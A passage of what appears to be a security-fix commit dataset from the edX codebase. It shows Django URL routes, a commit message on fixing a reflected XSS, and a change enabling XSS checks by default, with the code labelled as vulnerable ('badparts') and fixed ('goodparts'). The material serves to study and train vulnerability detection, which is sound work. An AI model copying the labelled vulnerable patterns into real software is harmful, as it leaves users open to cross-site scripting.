   url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."
        },
        "1162dbc18fda91b07a5942873387d60fd67b2cfc": {
            "url": "https://api.github.com/repos/Dalas/edx/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "html_url": "https://github.com/Dalas/edx/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "keyword": "XSS check",
            "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
            "message": "",
            "files": {
                "/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {
                    "changes": [
                        {
                            "diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=False):"
                            ],
                            "goodparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=True):"
                            ]
                        },
                        {
                            "diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'",
                            "add": 2,
                            "remove": 2,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'True')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"
                            ],
                            "goodparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'False')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ",
                    "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"
                },
                "/pavelib/utils/test/suites/bokchoy_suite.py": {
                    "changes": [
                        {
                            "diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/utils/test/suites/bokchoy_suite.py",
                            "badparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"
                            ],
                            "goodparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"
                            ]
                        }
                    ],
